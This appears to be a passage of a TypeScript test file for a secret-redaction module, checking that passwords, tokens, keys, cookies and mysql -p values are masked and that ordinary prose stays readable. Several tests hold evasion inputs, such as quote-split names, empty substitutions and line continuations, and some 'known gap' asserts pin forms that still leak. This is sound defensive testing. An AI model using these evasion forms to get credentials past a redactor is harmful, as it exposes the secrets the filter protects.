  eq('aws_secret_' + 'access_key "' + aws + '"', 'aws_secret_' + 'access_key "[redacted]"', 'aws secret after a space: quoted');
  eq('aws_secret_' + 'access_key is required', 'aws_secret_' + 'access_key is required', 'aws secret name in prose stays');
  eq('aws_secret_' + 'access_key ' + aws.slice(0, 39), 'aws_secret_' + 'access_key ' + aws.slice(0, 39), 'aws secret: 39 characters is not one');
  // 3. Google API keys (already hidden on main; the test pins the issue's own shape: AIzaSy + 33)
  eq('AI' + 'zaSy' + an(33), '[redacted]', 'google key: AIzaSy + 33');
  eq('key=AI' + 'zaSy' + an(33) + '&x=1', 'key=[redacted]&x=1', 'google key in a query');
  // 5. short values after a secret name: 4 to 7 characters with a letter and a digit
  eq('password=abc123', 'password=[redacted]', 'short: password=abc123');
  eq('pwd: ' + 'hunter2', 'pwd: [redacted]', 'short: pwd: hunter2');
  eq('token: abc1234', 'token: [redacted]', 'short: token: abc1234');
  eq('client_secret=a1b2c3d', 'client_secret=[redacted]', 'short: client_secret');
  eq('{"password": "ab12"}', '{"password": "[redacted]"}', 'short: JSON, 4 characters');
  eq('https://h.example/cb?token=abc123&x=1', 'https://h.example/cb?token=[redacted]&x=1', 'short: in a query');
  for (const t of ['token: none', 'password: see below', 'the password: required', 'token: abc', 'token: a12', 'password=changeme', 'Password: ******', 'token: expired', 'token: 4096', 'password: 123456', 'secret: FR-186.', 'secret: T-14', 'token: string', 'password: optional', 'auth: abc123', 'pass: ab12', 'token: v2', 'password: <value>'])
    eq(t, t, `short stays: ${t}`);
  // 6. several words: each next word has a digit, so a word without one ends it
  eq('password: ab12 cd34 ef56', 'password: [redacted]', 'phrase: three words');
  eq('password: ab12 cd34 is the one', 'password: [redacted] is the one', 'phrase: stops at a word without a digit');
  eq('password: ab12 and then', 'password: [redacted] and then', 'phrase: one word and prose');
  eq('pwd=ab12 cd34, next=1', 'pwd=[redacted], next=1', 'phrase: stops at a comma');
  eq('token: ab12 cd34', 'token: [redacted] cd34', 'phrase: only passwords take more words');
  // 7. an unfinished value at the end of a stream
  eq('X-Api-Key: sk-' + 'ab12', 'X-Api-Key: [redacted]', 'unfinished: X-Api-Key sk-ab12');
  eq('api_key=gh' + 'p_a1', 'api_key=[redacted]', 'unfinished: api_key=ghp_a1');
  eq('X-Api-Key: sk-learn', 'X-Api-Key: [redacted]', 'unfinished: a key-like start is hidden even as a word');
  eq('X-Api-Key: none', 'X-Api-Key: none', 'unfinished stays: X-Api-Key: none');
  // 8. `token <value>`
  eq('token ' + 'abc1234xyz', 'token [redacted]', 'scheme word: token <value>');
  eq('curl --apikey a1b2c3d4e5 https://h', 'curl --apikey [redacted] https://h', 'scheme word: apikey <value>');
  for (const t of ['token ring network', 'token 4096', 'token 12345678', 'token docs/readme2.md', 'the token bucket', 'token configuration', 'token abc1234', 'token count: 1', 'api key rotation2'])
    eq(t, t, `scheme word stays: ${t}`);
  // 9. `Bearer x. <value>`
  // merge check of #1243 against main: this rule runs before the `Bearer` shape of `HELD_SHAPES`, so it hides the scheme word too, or it shows what `main` hides
  eq('"Authorization": "Bearer sk-proj-' + 'Ab1Cd2Ef3 x', '"Authorization": "[redacted] x', 'bearer: the scheme word goes as on main (a hyphen after the first word)');
  eq('Cookie: a=Bearer _Kxq.' + 'EbAt=cz6vz/yHTxbJHF; b=1', 'Cookie: [redacted]', 'bearer: a cookie header stays one mask as on main (no a=Bearer, no b=1)');
  eq('Bearer x. ' + 'abc1234xyz9Q', '[redacted]', 'bearer: a stop character after the first word');
  eq('bearer ab, ' + 'abc1234xyz9Qrs', '[redacted]', 'bearer: comma, lower case');
  eq('Bearer x. ' + 'abc1234xyz', 'Bearer x. ' + 'abc1234xyz', 'bearer stays: a value of 10 characters');
  eq('Bearer x. then more', 'Bearer x. then more', 'bearer stays: no value');
  eq('Bearer of bad news. Sorry', 'Bearer of bad news. Sorry', 'bearer stays: prose');
  // 10. Cookie
  eq('Cookie: sid=abc1234 x', 'Cookie: [redacted] x', 'cookie: short value, a word after it');
  eq('Cookie:' + 'abcd1234efgh5678', 'Cookie:[redacted]', 'cookie: no space, no name');
  eq('Cookie: lang=en x', 'Cookie: lang=en x', 'cookie stays: 2 characters');
  eq('Cookie: theme=dark x', 'Cookie: theme=dark x', 'cookie stays: a word with no digit');
  eq('cookie: a=b is the format', 'cookie: a=b is the format', 'cookie stays: prose');
  eq('Cookie: id=123456 x', 'Cookie: id=123456 x', 'cookie stays: a number');
  // 11. review of #1243 (fjcabello): neighbouring forms
  eq('mysql -u root \\\n  -p' + 'hunter2x db', 'mysql -u root \\\n  -p[redacted] db', 'mysql continuation: LF');
  eq('mysql -u root \\\r\n  -p' + 'hunter2x db', 'mysql -u root \\\r\n  -p[redacted] db', 'mysql continuation: CRLF');
  eq('mysql -u root \\\n-p' + 'hunter2x', 'mysql -u root \\\n-p[redacted]', 'mysql continuation: the flag at the line start');
  for (const t of ['mysql -u root \\\n  -P 3306 db', 'mysql \\\n -p db', 'echo a \\\n -pabc123', 'mysql -u root\n-pabc123x'])
    eq(t, t, `mysql continuation stays: ${JSON.stringify(t)}`);
  eq('Bearer: ' + 'ey12abcdEFGH', 'Bearer: [redacted]', 'bearer colon: with a space');
  eq('bearer:' + 'ey12abcdEFGH', 'bearer:[redacted]', 'bearer colon: no space, lower case');
  for (const t of ['Bearer: configuration', 'Bearer: none', 'Bearer: ey12abc'])
    eq(t, t, `bearer colon stays: ${t}`);
  eq('secret access key: ' + aws, 'secret access key: [redacted]', 'spaced name: colon');
  eq('AWS Secret Access Key = ' + aws, 'AWS Secret Access Key = [redacted]', 'spaced name: equals, title case');
  // 12. self-review of #1243 (F1 to F6) and the mutants it found alive
  // F6: the rest of a password that arrived in pieces (the first word is already a mask)
  eq('pwd=[redacted] blue8 x', 'pwd=[redacted] x', 'phrase after a mask: pwd');
  eq('password: [redacted]4 ef56 done', 'password: [redacted] done', 'phrase after a mask: characters glued to the mask');
  eq('password: [redacted] ef56 done', 'password: [redacted] done', 'phrase after a mask: password');
  for (const t of ['password: [redacted] is', 'token: [redacted] blue8', 'password: [redacted] none'])
    eq(t, t, `phrase after a mask stays: ${t}`);
  // phrase limits (mutants: one space, word minimum 3, at most 2 words, order, passphrase, the pwd lookbehind)
  eq('password: ab12  cd34', 'password: [redacted]', 'phrase: two spaces between words');
  eq('password: ab12 c3', 'password: [redacted]', 'phrase: a word of 2 characters');
  eq('password: ' + Array.from({ length: 10 }, (_, i) => 'ab' + String(i + 10)).join(' '), 'password: [redacted] ab19', 'phrase: nine words, the tenth stays');
  eq('password=Summer2024Secret cd34 ef56', 'password=[redacted]', 'phrase: a long first word takes the tail too');
  eq('passphrase: ab12 cd34', 'passphrase: [redacted]', 'phrase: passphrase');
  for (const t of ['bpwd: ab12 cd34', 'bpwd=abc123']) eq(t, t, `pwd needs no letter before it: ${t}`);
  // key leads cut short
  for (const lead of ['sk-', 'gh' + 'p_', 'gh' + 'o_', 'gh' + 'u_', 'gh' + 's_', 'gh' + 'r_', 'gl' + 'pat-', 'xo' + 'xb-', 'hf_', 'np' + 'm_']) eq('api_key=' + lead + 'ab', 'api_key=[redacted]', `unfinished lead: ${lead}`);
  // F5: the mysql window ends at a shell separator, and at a program name that is not followed by a space
  for (const t of ['echo mysql; tar -pxf a1.tgz', 'mysql -e "x" && cp -pr src2 dst', 'mysql -e "select 1" | grep -pv', 'docker run mysql:8 sh -c "ls -pa1"', 'mysql -u r\n -pabc123x'])
    eq(t, t, `mysql window stays: ${JSON.stringify(t)}`);
  eq('mysql ' + 'a '.repeat(50) + '-p' + 'abc123x', 'mysql ' + 'a '.repeat(50) + '-p[redacted]', 'mysql: a flag 100 characters on');
  // F2: any case, mysql8, a backtick value, PowerShell and cmd continuations
  eq('MYSQL -p' + 'abc123x', 'MYSQL -p[redacted]', 'mysql: upper case');
  eq('MySQL8 -u r -p' + 'abc123x', 'MySQL8 -u r -p[redacted]', 'mysql: mysql8');
  eq('mysql -p`my pass` db', 'mysql -p[redacted] db', 'mysql: backtick-quoted value');
  eq('mysql -u r `\n -p' + 'abc123x', 'mysql -u r `\n -p[redacted]', 'mysql: PowerShell continuation');
  eq('mysql -u r ^\r\n -p' + 'abc123x', 'mysql -u r ^\r\n -p[redacted]', 'mysql: cmd continuation');
  // F4: ids, versions and algorithm names stay; a real short password still goes
  for (const v of ['T144', 'v1.2', 'v1.2.3', '0x1f', '0x02', '#ff00aa', 'sha256', 'utf8', 'base64', 'HS256', 'int64', 'ipv4', 'oauth2', 'ed25519', 'aes256', 'x509', 'pkcs8', 'PKCS#12', 'win32'])
    for (const name of ['token', 'secret', 'password']) eq(`${name}: ${v}`, `${name}: ${v}`, `short stays: ${name}: ${v}`);
  for (const v of ['abc123', 'a1b2c3d', 'Zx9Zx9', 'hunter2']) eq('password: ' + v, 'password: [redacted]', `short goes: ${v}`);
  // F1: Bearer stops
  const bv = 'abc123def456ghi';
  eq('Bearer abcdefg. ' + bv, '[redacted]', 'bearer: a first word of 7 characters');
  eq('BEARER ab12:' + bv, '[redacted]', 'bearer: no space after the stop');
  eq('Bearer x) "' + bv + '"', '[redacted]"', 'bearer: a quote before the value');
  eq('Bearer ab! ' + bv, '[redacted]', 'bearer: !');
  eq('Bearer ab- ' + bv, '[redacted]', 'bearer: -');
  eq('Bearer x. abcdefghijkl', 'Bearer x. abcdefghijkl', 'bearer stays: 12 letters and no digit');
  // survivors of the pre-review mutant run (2026-11-07): each line names the mutant it kills
  for (const t of ['token: RS256', 'secret: tls13']) eq(t, t, `short stays: ${t} (NOT_SHORT without rs, tls)`);
  eq('Bearer ab; ' + bv, '[redacted]', 'bearer: ; after the first word');
  eq('Bearer ab? ' + bv, '[redacted]', 'bearer: ? after the first word');
  eq('mysql -e "select `id`" -p' + 'S3cret', 'mysql -e "select `id`" -p[redacted]', 'mysql: a backtick that is not a continuation');
  eq('mysql -e "a\\b" -p' + 'S3cret', 'mysql -e "a\\b" -p[redacted]', 'mysql: a backslash that is not a continuation');
  eq('mysql -e "a^b" -p' + 'S3cret', 'mysql -e "a^b" -p[redacted]', 'mysql: a caret that is not a continuation');
  eq('password=123abc', 'password=[redacted]', 'short goes: digits first, then letters');
  eq('Cookie: v=a1 x', 'Cookie: v=a1 x', 'cookie stays: 2 characters with a letter and a digit');
  eq('pwd=[redacted] ab12 cd34 ef56 x', 'pwd=[redacted] x', 'phrase after a mask: three words');
  eq('passwd: ab12 cd34', 'passwd: [redacted]', 'phrase: passwd');
  // survivors of the first mutant run
  eq('secret_access_' + 'key ' + aws, 'secret_access_' + 'key [redacted]', 'aws secret after a space: no aws_ in the name');
  eq('token    ' + 'abc1234xyz', 'token    [redacted]', 'scheme word: four spaces');
  eq('Cookie: sid=ab12 x', 'Cookie: [redacted] x', 'cookie: exactly 4 characters');
  eq('secret access_key: ' + aws, 'secret access_key: [redacted]', 'spaced name: a space, then an underscore');
  eq('secret   access key: ' + aws, 'secret   access key: [redacted]', 'spaced name: several spaces');
  eq('aws secret_access key ' + aws, 'aws secret_access key [redacted]', 'spaced name: mixed with an underscore');
  for (const t of ['secret access key: required', 'secret access key is ' + aws.slice(0, 20), 'secret access key: ' + aws.slice(0, 39)])
    eq(t, t, `spaced name stays: ${t.slice(0, 40)}`);
  // Review of #1243 by fjcabello (2026-11-07), round 2
  eq('password=sha' + '256x', 'password=[redacted]', 'NOT_SHORT: a name plus more characters is a password: password=sha256x');
  // Merge with #1244: `mysql -p` with hidden characters, the fast path (`maskOutgoing`) against the full path (the reference, copy pass always)
  {
    const val = 'S3cret' + 'Value9';
    const inertPad = (h: string): string => ('é' + h + 'é').repeat(70); // 210 characters, 140 without the hidden ones: the 200-character window of the mysql rule reaches `-p` only in the copy
    for (const [hn, h] of [['ZWSP', '​'], ['ZWJ', '‍'], ['soft hyphen', '­'], ['VS16', '️']]) {
      const cases: Array<[string, string]> = [
        ['in the program name', `my${h}sql -p${val} db`], ['between -p and the value', `mysql -p${h}${val} db`], ['inside the value', `mysql -p${val.slice(0, 6)}${h}${val.slice(6)} db`],
        ['in all three', `my${h}sql -p${h}${val.slice(0, 6)}${h}${val.slice(6)} db`],
        ['after an inert run of 70 pairs', `mysql ${inertPad(h)} -p${val} db`], ['after an inert run, value split', `mysql ${inertPad(h)} -p${val.slice(0, 6)}${h}${val.slice(6)} db`],
      ];
      for (const [where, t] of cases) {
        const fast = maskOutgoing(t, []).text;
        const full = maskKeepingMarkdownReference(t, []).text;
        const label = `mysql -p with ${hn} ${where}`;
        assert.strictEqual(fast, full, `hidden mysql: fast path equals the full path: ${label}`);
        for (const [n, out] of [['fast', fast], ['full', full]]) {
          const plain = unhide(out);
          assert.ok(!plain.includes(val) && !plain.includes('S3cret') && !plain.includes('Value9') && !plain.includes('cretV'), `hidden mysql: ${n} path shows no part of the value: ${label}`);
        }
      }
    }
  }
  // R1: a name takes only the sizes it has, `#` only a hex colour: these are passwords and go
  for (const [t, w] of [['password: Win' + '2024', 'password: [redacted]'], ['password=win' + '2024', 'password=[redacted]'], ['password: Iso' + '2024', 'password: [redacted]'], ['password: Des' + '123', 'password: [redacted]'], ['password=x' + '1234', 'password=[redacted]'], ['secret=Tls' + '1337', 'secret=[redacted]'], ['password=hs' + '2023', 'password=[redacted]'], ['apikey: es' + '2022', 'apikey: [redacted]'], ['password = Win' + '2024 cd34', 'password = [redacted]'], ['password=#hunt' + '3', 'password=[redacted]'], ['password=#Zz9' + '9q', 'password=[redacted]'], ['password=sha' + '2024', 'password=[redacted]']])
    eq(t, w, `NOT_SHORT: a password goes: ${t}`);
  // R1: what stays on purpose (a [KNOWN GAP] in FR-170 item 5, each pinned here)
  for (const t of ['password=0x' + '1234', 'api_key=0x' + 'dead', 'token=v1.' + '2.3', 'password: X' + '12345', 'password=Q' + '2024', 'password=#abc' + '123', 'token: #ff' + '00aa', 'token: SHA' + '512', 'token: Win' + '64', 'token: AES' + '128', 'token: TLS' + '12', 'token: md' + '5'])
    eq(t, t, `NOT_SHORT: left readable on purpose (known gap): ${t}`);
  // N3 (review of #1243): `NOT_SHORT` takes a colour of 3, 4 or 6 hex digits; 5 is not one (an 8-digit colour with its `#` is 9 characters, past the 4 to 7 window, so the rule has no 8)
  for (const [t, w] of [['password=#abc' + '12', 'password=[redacted]'], ['password=#a1b2' + 'c', 'password=[redacted]'], ['password: #abc' + '12, next', 'password: [redacted], next'], ['password=#abc' + '12.', 'password=[redacted]']])
    eq(t, w, `NOT_SHORT: five hex digits are not a colour: ${t}`);
  for (const t of ['password=#abc', 'password=#abc1', 'password=#abc' + '123', 'token: #ff' + '00aa']) eq(t, t, `NOT_SHORT: a 3, 4 or 6 digit colour stays: ${t}`);
  // B2 (re-review of #1243 at f8af91b1a): the rest of a value glued to a mask after a secret name joins the mask (a stream masked the short prefix first); a mask with no name before it, a space or an escape after it, stay
  eq('password: [redacted]!word' + '12345', 'password: [redacted]', 'B2: the rest glued to a mask after a name is masked');
  eq('(token: [redacted](S3cret)' + '99)', '(token: [redacted])', 'B2: the rest stops at a bracket opened before the name');
  for (const t of ['the [redacted]!x' + '12345 stays', 'password: [redacted] next words', '{\\"token\\":\\"[redacted]\\"}']) eq(t, t, `B2 stays: ${t}`);
  // N2: an unterminated quoted -p value
  eq('mysql -u r -p"S3' + 'cret9x', 'mysql -u r -p[redacted]', 'mysql -p: unterminated double quote');
  eq("mysql -u r -p'S3" + 'cret9x', 'mysql -u r -p[redacted]', 'mysql -p: unterminated single quote');
  eq('mysql -u r -p`S3' + 'cret9x\nnext line', 'mysql -u r -p[redacted]\nnext line', 'mysql -p: unterminated backtick ends at the line');
  // re-review of #1243 at 5ede1bfde: the double and single quote forms end at a line break too (LF and CRLF), not only at the end of the text
  for (const q of ['"', "'"]) for (const [eol, name] of [['\n', 'LF'], ['\r\n', 'CRLF']]) {
    eq(`mysql -u r -p${q}S3` + `cret9x${eol}next line`, `mysql -u r -p[redacted]${eol}next line`, `mysql -p: unterminated ${q === '"' ? 'double' : 'single'} quote ends at the line (${name})`);
  }
  // N4: the quote after the program name needs a space or comma after it (mutant: `["\']` without the lookahead)
  for (const t of ["MySQL's docs: use rsync -ptgo src dst", '{"mysql":{"opts":"-pfoo' + '123"}}']) eq(t, t, `mysql -p stays: a quote after the name with no space: ${t}`);
  // R2: the quoted and array forms of -p
  eq('test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-u", "root", "-pS3' + 'cret9x"]', 'test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-u", "root", "-p[redacted]"]', 'mysql -p: docker healthcheck array');
  eq("mysql -uroot '-pS3" + "cret9x' db", "mysql -uroot '-p[redacted]' db", "mysql -p: single-quoted whole argument");
  eq('mysql -uroot "-pS3' + 'cret9x" db', 'mysql -uroot "-p[redacted]" db', 'mysql -p: double-quoted whole argument');
  eq('{"cmd":["mysql","-u","root","-pS3' + 'cret9x"]}', '{"cmd":["mysql","-u","root","-p[redacted]"]}', 'mysql -p: JSON array, program quoted');
  for (const t of ['docker run mysql:8 -p 3306:3306', '["CMD", "mysql", "-p", "x"]', 'docker run mysql:8 -p' + 'foo123 x'])
    eq(t, t, `mysql -p stays: ${t}`);
  // R3: a short flag value of prose (mkdir -pv) is not a password; 3 characters or more is
  for (const t of ['After mysql starts, run mkdir -pv logs', 'mysql docs say use rsync -pt src dst', 'run mysql then `ls -pa1`', 'Install MySQL 8 and run cp -pR a b'])
    eq(t, t, `mysql -p stays: prose with a short flag: ${t}`);
  eq('mysql -u r -pab' + '1 db', 'mysql -u r -p[redacted] db', 'mysql -p: 3 characters go');
  eq('mysql -u r -pAb' + '12', 'mysql -u r -p[redacted]', 'mysql -p: 4 characters go');
  // #1298: the glued form in a sentence and a command line
  eq('run mysql -p' + 'hunter2x db', 'run mysql -p[redacted] db', '#1298: mysql -p<pass> db glued');
  assert.ok(!maskSecretCommand('run mysql -p' + 'hunter2x db').includes('hunter2x'), '#1298: maskSecretCommand hides the glued mysql password');
}

// Issue #1298 (spec 012 FR-174): a secret name split by quotes is the name the shell reads. Values are made up at run time.
{
  const V = an(12);
  const P = 'pass' + 'word';
  const both = (cmd: string, want: string, label: string): void => {
    assert.strictEqual(maskSecretCommand(cmd, {}), want, `#1298: maskSecretCommand: ${label}`);
    assert.strictEqual(redact(cmd, {}), want, `#1298: redact: ${label}`);
  };
  both(`run echo 'pass'"word"=${V}`, `run echo 'pass'"word"=[redacted]`, `the issue's example 'pass'"word"=<value>`);
  both(`echo pa"ss"word=${V}`, `echo pa"ss"word=[redacted]`, 'a name split once inside');
  both(`echo "pass"word=${V}`, `echo "pass"word=[redacted]`, 'a quoted head');
  both(`echo pass'word'=${V}`, `echo pass'word'=[redacted]`, 'a quoted tail');
  both(`echo "pass"'word'=${V}`, `echo "pass"'word'=[redacted]`, 'two quote kinds');
  both(`echo pa''ss''word=${V}`, `echo pa''ss''word=[redacted]`, 'empty quotes inside');
  both(`echo 'tok'"en"=${V}`, `echo 'tok'"en"=[redacted]`, 'token split');
  both(`echo "api_"'key'=${V}`, `echo "api_"'key'=[redacted]`, 'api_key split');
  both(`echo 'pass'"word"="${V}"`, `echo 'pass'"word"="[redacted]"`, 'a quoted value');
  both(`echo pa\\ss${P.slice(4)}=${V}`, `echo pa\\ss${P.slice(4)}=[redacted]`, 'a backslash inside the name');
  assert.ok(!maskSecretCommand(`sh -c "echo 'pass'\\"word\\"=${V}"`, {}).includes(V), '#1298: inside sh -c with escaped quotes');
  assert.ok(!redact(`sh -c "echo 'pass'\\"word\\"=${V}"`, {}).includes(V), '#1298: redact: inside sh -c with escaped quotes');
  assert.ok(!maskSecretCommand(`run env X=1 'DB_'"PASS"'WORD'=${V} cmd`, {}).includes(V), '#1298: an upper-case name split in three');
  // pre-review of PR 1317: the quote run between two atoms of a name has no limit (the shell takes any number of empty quotes); it was 6, so a seventh was a bypass
  both(`echo pa${'""'.repeat(4)}ss${'""'.repeat(2)}word=${V}`, `echo pa${'""'.repeat(4)}ss${'""'.repeat(2)}word=[redacted]`, 'eight quote characters inside a name (more than 6 in one gap)');
  both(`echo pa${'"'.repeat(200)}ss${P.slice(4)}=${V}`, `echo pa${'"'.repeat(200)}ss${P.slice(4)}=[redacted]`, '200 quote characters inside a name');
  both(`echo to${"'\\".repeat(30)}ken=${V}`, `echo to${"'\\".repeat(30)}ken=[redacted]`, 'quotes and backslashes mixed, 60 in one gap');
  assert.strictEqual(redact(`echo pa${'"'.repeat(200)}x=${V}`, {}), `echo pa${'"'.repeat(200)}x=${V}`, '#1298: a long quote run inside a word that is not a secret name stays');
  // what stays: a name that is not a secret, a short value, a split that is not a secret name, the plain forms
  assert.strictEqual(redact(`echo 'max_to'"kens"=${V}`, {}), `echo 'max_to'"kens"=${V}`, '#1298: max_tokens split stays');
  assert.strictEqual(redact(`echo "to"ken=short`, {}), `echo "to"ken=short`, '#1298: a short value stays');
  // merge of PR 1243 with PR 1317: a short value (4 to 7 characters with a letter and a digit, issue #1227) after a split name that is not a password name (`SHORT_NAMES` takes the quote runs too)
  for (const [t, want] of [[`echo 'tok'"en"=ab12`, `echo 'tok'"en"=[redacted]`], [`echo "api_"'key'=Zx9Zx9`, `echo "api_"'key'=[redacted]`], [`{"cli""ent_secret": "Qw3rt"}`, `{"cli""ent_secret": "[redacted]"}`]]) {
    assert.strictEqual(redact(t, {}), want, `#1227 with #1298: a short value after a split name is hidden: ${t}`);
  }
  for (const t of [`echo 'tok'"en"=4096`, `echo 'tok'"en"=FR-186`]) assert.strictEqual(redact(t, {}), t, `#1227 with #1298: a number or an id after a split name stays: ${t}`);
  assert.strictEqual(redact(`echo 'user'"name"=${V}`, {}), `echo 'user'"name"=${V}`, '#1298: a name that is not secret stays');
  assert.strictEqual(redact(`echo ${P}=${V}`, {}), `echo ${P}=[redacted]`, 'the plain form is still hidden');
  assert.strictEqual(redact(`{"${P}": "${V}"}`, {}), `{"${P}": "[redacted]"}`, 'the JSON form is still hidden');
}

// Review of PR 1317 (Ruben), items 1 and 2. Every input is run through the four surfaces that take free text: `redact`, `maskTokenShapes`, `maskOutgoing` and `maskNoteText` (notes go to disk); the
// command mask too where the input is a command. Values are made up at run time.
{
  const V = an(14);
  const tok = 'gh' + 'p_' + an(36);
  const surfaces: Record<string, (t: string) => string> = {
    redact: (t) => redact(t, {}),
    maskTokenShapes: (t) => maskTokenShapes(t, '[redacted]'),
    maskOutgoing: (t) => maskOutgoing(t, []).text,
    maskNoteText: (t) => maskNoteText(t, []).text,
  };
  const hidden = (input: string, label: string, withCommand = false): void => {
    for (const [name, f] of Object.entries(surfaces)) assert.ok(!f(input).includes(V), `${label}: ${name} shows the value in ${JSON.stringify(f(input).replace(V, '<LEAK>'))}`);
    if (withCommand) assert.ok(!maskSecretCommand(input, {}).includes(V), `${label}: maskSecretCommand shows the value`);
  };
  // item 1: a secret name glued to a mask. The glued-rest scan must not fold the name into the mask before the named-secret rules see it (a value that starts with a quote, a backslash or a space after the colon stayed readable)
  hidden(`${tok}-dbpassword: "${V}"`, '#1317 item 1: a token, -dbpassword: "value"');
  hidden(`${tok}.password=\\"${V}\\"`, '#1317 item 1: a token, .password=\\"value\\"');
  hidden(`${tok}-xxpassword="${V}"`, '#1317 item 1: a token, -xxpassword="value"');
  hidden(`x=${tok}_aaaaaaaaaaaaaaaaapi_key="${V}"`, '#1317 item 1: x=<token>_…api_key="value"');
  hidden(`see [redacted]-mydbpassword: "${V}"`, '#1317 item 1: a mask already in the text, -mydbpassword: "value"');
  hidden(`${tok}-dbpassword: '${V}'`, '#1317 item 1: single quotes');
  assert.strictEqual(redact(`${tok}-dbpassword: "${V}"`, {}), '[redacted]: "[redacted]"', '#1317 item 1: both are masks and the words between them are gone with the glued name');
  // item 2: any run of quotes (or an empty `` or $()) between a name and its separator, around the value, and inside the name
  hidden(`--pass'word'''=${V}`, '#1317 item 2: --pass\'word\'\'\'=value', true);
  hidden(`--password''=${V}`, '#1317 item 2: --password\'\'=value', true);
  hidden(`''--pass''word''=''${V}''`, '#1317 item 2: \'\'--pass\'\'word\'\'=\'\'value\'\'', true);
  hidden(`--password${'"'.repeat(40)}=${V}`, '#1317 item 2: 40 quotes before the separator', true);
  hidden(`--password=${"'".repeat(40)}${V}`, '#1317 item 2: 40 quotes before the value', true);
  hidden(`--pa\`\`ss=${V}`, '#1317 item 2: an empty backtick pair inside a name', true);
  hidden(`--pa$()ss=${V}`, '#1317 item 2: an empty $() inside a name', true);
  hidden(`--password$()=${V}`, '#1317 item 2: an empty $() after a name', true);
  hidden(`--password\`\`=${V}`, '#1317 item 2: an empty backtick pair after a name', true);
  hidden(`pa$'ss'word=${V}`, '#1317 item 2: the $ of $\'…\' inside a name', true);
  hidden(`--pa$()$()\`\`ss=${V}`, '#1317 item 2: empty splits mixed', true);
  // round 2 of the review: a line continuation (backslash and line break) is removed by the shell too; `$( )` and a backtick pair with spaces are empty
  hidden(`--pass\\\nword=${V}`, '#1317 round 2: a backslash and a line break inside a name', true);
  hidden(`--pass\\\r\nword=${V}`, '#1317 round 2: a backslash and CRLF inside a name', true);
  hidden(`--password\\\n=${V}`, '#1317 round 2: a line continuation after a name', true);
  hidden(`--pa$( )ss=${V}`, '#1317 round 2: $( ) with a space inside a name', true);
  hidden(`--pa\` \`ss=${V}`, '#1317 round 2: a backtick pair with a space inside a name', true);
  hidden(`--password$( )=${V}`, '#1317 round 2: $( ) with a space after a name', true);
  hidden(`--password=$( )${V}`, '#1317 round 2: $( ) with a space before the value', true);
  // round 3: a line continuation before the value (`--password=\<newline>V`, also CRLF, with quotes, and twice)
  hidden(`--password=\\\n${V}`, '#1317 round 3: a line continuation before the value', true);
  hidden(`--password=\\\r\n${V}`, '#1317 round 3: a line continuation (CRLF) before the value', true);
  hidden(`--password=\\\n'${V}'`, '#1317 round 3: a line continuation before a quoted value', true);
  hidden(`--password=\\\n\\\n${V}`, '#1317 round 3: two line continuations before the value', true);
  hidden(`--password=\\\n"${V}"`, '#1317 round 3: a line continuation before a double-quoted value', true);
  hidden(`password: \\\n${V}`, '#1317 round 3: a line continuation after a colon');
  // round 3: whitespace- or comment-only substitutions that expand to nothing are a LISTED GAP (spec 012 FR-174), not a name. These asserts pin the leak: when a later fix makes one of them
  // masked, its assert fails and the list in the spec and issue #1320 shrink with it.
  const gapShown = (input: string, label: string): void => assert.ok(redact(input, {}).includes(V), `#1317 round 3 KNOWN GAP pinned (it leaks today; a fix updates the spec list and #1320): ${label}`);
  gapShown(`--pa$(  )ss=${V}`, '$(  ) with two spaces inside a name');
  gapShown(`--pa$(\t)ss=${V}`, '$(<tab>) inside a name');
  gapShown(`--pa$(\n)ss=${V}`, '$(<newline>) inside a name');
  gapShown(`--pa\`  \`ss=${V}`, 'a backtick pair with two spaces inside a name');
  gapShown(`--pa\`\t\`ss=${V}`, 'a backtick pair with a tab inside a name');
  gapShown(`--pa$(#x)ss=${V}`, '$(#x), a comment-only substitution, inside a name');
  assert.strictEqual(redact(`echo --pa$(x)ss=${V}`, {}), `echo --pa$(x)ss=${V}`, '#1317 round 2: a non-empty substitution is a listed gap, not a name');
  // a hidden character in the text makes `maskOutgoing` take its slow path: the head list (`LIVE_HEADS`) must see the same names
  hidden(`--pass'word'''=${V}​`, '#1317 item 2: a zero-width character after the value, quote run before the separator');
  // what stays
  assert.strictEqual(redact(`echo max_to$()kens=${V}`, {}), `echo max_to$()kens=${V}`, '#1317 item 2: an empty $() inside a name that is no secret stays');
  assert.strictEqual(redact(`echo pa\`\`x=${V}`, {}), `echo pa\`\`x=${V}`, '#1317 item 2: an empty backtick pair in a word that is no secret name stays');
  assert.strictEqual(redact(`echo ${tok}-dbname: "plain words here"`, {}), `echo [redacted]-dbname: "plain words here"`, '#1317 item 1: a non-secret name glued to a mask keeps its value');
}

// A real image, whole, stays (every repo image: test-redact-images.ts).
{
  const png = fs.readFileSync(path.join(__dirname, '..', '..', 'build', 'icon.png')).toString('base64');
  const u = `data:image/png;base64,${png}`;
  assert.strictEqual(redact(u, {}), u.length > REDACT_MAX_CHARS ? redact(u.slice(0, REDACT_MAX_CHARS), {}) : u, 'build/icon.png as a data URL');
}
// The mechanism behind it, with made-up base64: not after `/` or `+`, and not when more base64 follows
for (const t of ['ab/' + 'EA' + 'AA' + an(70) + '/cd', 'ab+' + 'EA' + 'AA' + an(70), 'EA' + 'AA' + an(70) + '/cd', 'ab/' + 'EA' + 'AC' + an(120) + '+x', 'ab/' + 'AB' + 'SK' + an(120), '/AI' + 'za' + an(35), '+S' + 'K' + hex(32), 'SK' + hex(32) + '/', '-' + 'EA' + 'AA' + an(70), '_' + 'EA' + 'AA' + an(70), 'A'.repeat(22) + 'B' + an(100), an(76) + '\n' + 'EA' + 'AA' + an(72) + '\n' + an(76), 'EA' + 'AA' + an(72) + '\n' + an(76), an(76) + '\\n' + 'EA' + 'AA' + an(72)]) assert.strictEqual(redact(t, {}), t, `base64 stays: ${t.slice(0, 16)}…`);

console.log(`redact shapes: all checks passed (${count} samples, ${STAYS.length} that stay)`);
